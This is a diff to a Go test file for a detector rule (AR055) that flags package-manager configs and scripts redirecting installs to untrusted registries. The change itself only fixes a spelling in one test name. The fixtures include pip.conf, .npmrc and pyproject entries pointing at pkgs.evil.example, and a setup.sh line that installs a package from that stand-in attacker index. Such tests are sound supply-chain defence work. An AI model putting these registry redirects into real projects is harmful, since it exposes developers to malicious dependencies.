@@ -82,7 +82,7 @@ func TestSourceRedirectAR055(t *testing.T) {
 		{name: "pip.conf", skill: body("x\n"), files: manifestFiles("pip.conf", "[global]\nindex-url = https://pkgs.evil.example/simple\n"), want: []string{"AR055:pip.conf:2"}},
 		{name: "pip.conf default", skill: body("x\n"), files: manifestFiles("pip.conf", "[global]\nindex-url = https://pypi.org/simple\n"), absent: []string{"AR055"}},
 		{name: "npmrc registry", skill: body("x\n"), files: manifestFiles(".npmrc", "registry=https://npm.evil.example/\n"), want: []string{"AR055:.npmrc:1"}},
-		{name: "npmrc scoped registry is a dependency-confusion defence", skill: body("x\n"), files: manifestFiles(".npmrc", "@acme:registry=https://npm.evil.example/\n"), absent: []string{"AR055"}},
+		{name: "npmrc scoped registry is a dependency-confusion defense", skill: body("x\n"), files: manifestFiles(".npmrc", "@acme:registry=https://npm.evil.example/\n"), absent: []string{"AR055"}},
 		{name: "npmrc default and auth token", skill: body("x\n"), files: manifestFiles(".npmrc", "registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n"), absent: []string{"AR055"}},
 		{name: "pyproject uv index", skill: body("x\n"), files: manifestFiles("pyproject.toml", "[[tool.uv.index]]\nname = \"corp\"\nurl = \"https://pkgs.evil.example/simple\"\n"), want: []string{"AR055:pyproject.toml:3"}},
 		{name: "pip install flag in a script", skill: body("x\n"), files: map[string]string{".ai-rulez/skills/bad/scripts/setup.sh": "#!/bin/sh\npip install --extra-index-url https://pkgs.evil.example/simple helper==1.0\n"}, want: []string{"AR055:setup.sh:2"}},
